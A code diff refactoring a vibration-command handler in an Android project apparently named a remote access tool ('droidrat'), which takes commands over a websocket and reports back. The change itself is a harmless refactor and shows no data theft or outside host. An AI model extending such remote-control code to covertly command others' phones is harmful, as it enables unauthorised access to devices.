@@ -10,9 +10,7 @@ import static com.je_chen.droidrat_je.service.command.ProcessCommandService.webs
 
 public class VibratorCommand extends CommandFather {
 
-    private final String TAG = "Vibrator Event ";
-
-    private VibratorSystem vibratorSystem;
+    private final VibratorSystem vibratorSystem;
 
     public VibratorCommand(Context context) {
         vibratorSystem = new VibratorSystem(context);
@@ -27,13 +25,12 @@ public class VibratorCommand extends CommandFather {
     public void processCommand(String command) {
         try {
             String[] rawCommandArray = command.split(" ");
-            switch (rawCommandArray[1]) {
-                case "Vibrator":
-                    int millSec = Integer.parseInt(rawCommandArray[2]);
-                    Log.d(TAG, "Vibrator Vibrator " + millSec);
-                    vibratorSystem.startVibrator(millSec);
-                    this.send("Vibrator Vibrator " + millSec);
-                    break;
+            String TAG = "Vibrator Event ";
+            if ("Vibrator".equals(rawCommandArray[1])) {
+                int millSec = Integer.parseInt(rawCommandArray[2]);
+                Log.d(TAG, "Vibrator Vibrator " + millSec);
+                vibratorSystem.startVibrator(millSec);
+                this.send("Vibrator Vibrator " + millSec);
             }
         } catch (Exception e) {
             e.printStackTrace();
